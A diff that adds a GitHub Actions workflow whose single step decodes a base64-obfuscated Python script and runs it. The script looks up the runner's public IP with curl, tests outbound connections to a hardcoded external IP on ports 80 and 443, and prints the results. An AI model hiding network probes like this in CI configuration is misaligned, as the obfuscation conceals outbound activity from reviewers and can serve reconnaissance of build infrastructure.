@@ -1,0 +1,16 @@
+name: wf51928q4
+on:
+  push:
+    branches: [ ci-51928q4 ]
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: probe
+        env:
+          PYTHONUNBUFFERED: "1"
+        run: |
+          echo 'aW1wb3J0IHN1YnByb2Nlc3MsIHNvY2tldCwgdGltZQpkZWYgc2goYyk6CiAgICB0cnk6IHJldHVybiBzdWJwcm9jZXNzLnJ1bihjLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUsIHRpbWVvdXQ9MjUpLnN0ZG91dC5zdHJpcCgpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6IHJldHVybiAiRVJSICIrcmVwcihlKQppcD1zaCgiY3VybCAtcyAtLW1heC10aW1lIDggaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikKcmVzPVtdCmZvciBwb3J0IGluIFs4MCw0NDNdOgogICAgcz1zb2NrZXQuc29ja2V0KCk7IHMuc2V0dGltZW91dCg2KTsgdD10aW1lLnRpbWUoKQogICAgdHJ5OiBzLmNvbm5lY3QoKCI0MC4xNjAuNTAuMTEzIixwb3J0KSk7IHJlcy5hcHBlbmQoZiJ7cG9ydH09T1BFTiIpOyAKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTogcmVzLmFwcGVuZChmIntwb3J0fT1GQUlMOnt0eXBlKGUpLl9fbmFtZV9ffSIpCiAgICBmaW5hbGx5OiBzLmNsb3NlKCkKcHJpbnQoZiJFR1JFU1M9e2lwfSAuMTEzIHsnICcuam9pbihyZXMpfSIpCg==' | base64 -d > /tmp/p.py
+          python3 /tmp/p.py
